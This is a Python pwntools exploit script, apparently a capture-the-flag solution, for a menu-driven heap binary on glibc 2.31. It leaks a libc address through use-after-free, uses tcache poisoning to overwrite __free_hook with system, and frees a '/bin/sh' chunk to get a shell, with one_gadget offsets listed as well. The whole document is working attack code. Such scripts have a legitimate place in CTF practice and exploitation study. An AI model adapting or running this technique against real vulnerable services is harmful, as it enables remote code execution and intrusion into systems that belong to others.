#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("addr", 1337)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000015BD
            brva 0x000000000000142E
            brva 0x0000000000001303
            c
            set follow-fork-mode parent
            ''')

def malloc(idx, size, data):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'> ', str(idx))
    p.sendlineafter(b'> ', str(size))
    p.sendlineafter(b'> ', data)

def free(idx):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'> ', str(idx))

def edit(idx, data):
    p.sendlineafter(b'> ', str(3))
    p.sendlineafter(b'> ', str(idx))
    p.sendlineafter(b'> ', data)

def view(idx):
    p.sendlineafter(b'> ', str(4))
    p.sendlineafter(b'> ', str(idx))

# 2.31
# Leak libc
malloc(0, 0x500, b'a'*8)
malloc(1, 0x10, b'b'*8)

free(0)

view(0)

libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x1ecbe0
print("Libc base: " + hex(libc.address))

malloc(1, 0x30, b'a'*8)
malloc(2, 0x30, b'b'*8)

# Overwrite __free_hook
# 1 -> 2
# 1 -> __free_hook
free(2)
free(1)
edit(1, p64(libc.sym['__free_hook']))

one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]
# GDB()
malloc(1, 0x30, b'/bin/sh')
malloc(2, 0x30, p64(libc.sym['system']))

free(1)

p.interactive()